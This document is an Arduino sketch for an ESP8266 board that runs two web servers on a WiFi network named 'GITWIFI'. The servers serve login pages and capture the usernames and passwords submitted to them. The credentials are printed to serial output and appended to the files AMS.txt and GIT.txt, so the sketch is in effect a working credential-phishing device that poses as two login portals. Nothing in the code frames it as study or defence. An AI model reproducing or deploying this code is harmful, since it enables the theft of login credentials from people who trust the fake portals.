

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <FS.h>   

const char* imagefile = "/image.png";
const char* htmlfile = "/index.html";

//ESP AP Mode configuration
const char *ssid = "GITWIFI";
const char *password = "password";


ESP8266WebServer server(4000);

ESP8266WebServer server1(80);

void handleRoot() {
  server.sendHeader("Location", "/index.html", true);  //Redirect to our html web page
  server.send(302, "text/plane", "");
}

void handleRoot1() {
  server1.sendHeader("Location", "/index1.html", true);  //Redirect to our html web page
  server1.send(302, "text/plane", "");
}

void handleWebRequests() {
  if (loadFromSpiffs(server.uri())) return;
  String message = "File Not Detected\n\n";
  message += "URI: ";
  message += server.uri();
  message += "\nMethod: ";
  message += (server.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server.args();
  message += "\n";
  for (uint8_t i = 0; i < server.args(); i++) {
    message += " NAME:" + server.argName(i) + "\n VALUE:" + server.arg(i) + "\n";
  }
  server.send(404, "text/plain", message);
  Serial.println(message);
}


void handleWebRequests1() {
  if (loadFromSpiffs1(server1.uri())) return;
  String message = "File Not Detected\n\n";
  message += "URI: ";
  message += server1.uri();
  message += "\nMethod: ";
  message += (server1.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server1.args();
  message += "\n";
  for (uint8_t i = 0; i < server1.args(); i++) {
    message += " NAME:" + server1.argName(i) + "\n VALUE:" + server1.arg(i) + "\n";
  }
  server1.send(404, "text/plain", message);
  Serial.println(message);
}

void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println();


  SPIFFS.begin();
  Serial.println("File System Initialized");
  IPAddress ip(10, 1, 1, 2);
  IPAddress gateway(10, 1, 1, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.config(ip, gateway, subnet);
  WiFi.begin(ssid);
 
  Serial.print("Web Server IP:");
  Serial.println(WiFi.localIP());

  
  server.on("/", handleRoot);
  server.onNotFound(handleWebRequests); //Set setver all paths are not found so we can handle as per URI
  server.on("/checklogin.html", pass);
  server.begin();
  server1.on("/", handleRoot1);
  server1.onNotFound(handleWebRequests1); //Set setver all paths are not found so we can handle as per URI
  server1.on("/checklogin.html", pass1);
  server1.begin();
}

void pass()
{

  String Password = server.arg("p");
  String  Username = server.arg("u");
  Serial.println("");
  Serial.print("USERNAME AMS:");
  Serial.print(Username);
  Serial.println("");
  Serial.print("PASSWORD AMS:");
  Serial.print(Password);
  server.send(200, "text/html", "Done");
  File f = SPIFFS.open("/AMS.txt", "a");
if (!f) {
    Serial.println("file open failed");
     File f = SPIFFS.open("/AMS.txt", "a ");
}
    f.println("");
      f.print("USERNAME AMS:");
     f.print(Username);
      f.println("");
      f.print("PASSWORD AMS:");
     f.print(Password);
f.close();

}

void pass1()
{

  String Password = server1.arg("p");
  String  Username = server1.arg("u");
  Serial.println("");
  Serial.print("USERNAME GIT :");
  Serial.print(Username);
  Serial.println("");
  Serial.print("PASSWORD GIT :");
  Serial.print(Password);
  Serial.println("");
  Serial.println("************************");
  server1.send(200, "text/html", "Done");
File f = SPIFFS.open("/GIT.txt", "a");
if (!f) {
    Serial.println("file open failed");
     File f = SPIFFS.open("/GIT.txt", "a ");
}
    f.println("");
      f.print("USERNAME GIT:");
     f.print(Username);
      f.println("");
      f.print("PASSWORD GIT:");
     f.print(Password);
f.close();

}



void loop() {
  server.handleClient();
  server1.handleClient();
}

bool loadFromSpiffs(String path) {
  String dataType = "text/plain";
  if (path.endsWith("/")) path += "index.htm";

  if (path.endsWith(".src")) path = path.substring(0, path.lastIndexOf("."));
  else if (path.endsWith(".html")) dataType = "text/html";
  else if (path.endsWith(".htm")) dataType = "text/html";
  else if (path.endsWith(".css")) dataType = "text/css";
  else if (path.endsWith(".js")) dataType = "application/javascript";
  else if (path.endsWith(".png")) dataType = "image/png";
  else if (path.endsWith(".gif")) dataType = "image/gif";
  else if (path.endsWith(".jpg")) dataType = "image/jpeg";
  else if (path.endsWith(".ico")) dataType = "image/x-icon";
  else if (path.endsWith(".xml")) dataType = "text/xml";
  else if (path.endsWith(".pdf")) dataType = "application/pdf";
  else if (path.endsWith(".zip")) dataType = "application/zip";
  File dataFile = SPIFFS.open(path.c_str(), "r");
  if (server.hasArg("download")) dataType = "application/octet-stream";
  if (server.streamFile(dataFile, dataType) != dataFile.size()) {
  }

  dataFile.close();
  return true;
}



bool loadFromSpiffs1(String path) {
  String dataType = "text/plain";
  if (path.endsWith("/")) path += "index1.htm";

  if (path.endsWith(".src")) path = path.substring(0, path.lastIndexOf("."));
  else if (path.endsWith(".html")) dataType = "text/html";
  else if (path.endsWith(".htm")) dataType = "text/html";
  else if (path.endsWith(".css")) dataType = "text/css";
  else if (path.endsWith(".js")) dataType = "application/javascript";
  else if (path.endsWith(".png")) dataType = "image/png";
  else if (path.endsWith(".gif")) dataType = "image/gif";
  else if (path.endsWith(".jpg")) dataType = "image/jpeg";
  else if (path.endsWith(".ico")) dataType = "image/x-icon";
  else if (path.endsWith(".xml")) dataType = "text/xml";
  else if (path.endsWith(".pdf")) dataType = "application/pdf";
  else if (path.endsWith(".zip")) dataType = "application/zip";
  File dataFile = SPIFFS.open(path.c_str(), "r");
  if (server1.hasArg("download")) dataType = "application/octet-stream";
  if (server1.streamFile(dataFile, dataType) != dataFile.size()) {
  }

  dataFile.close();
  return true;
}

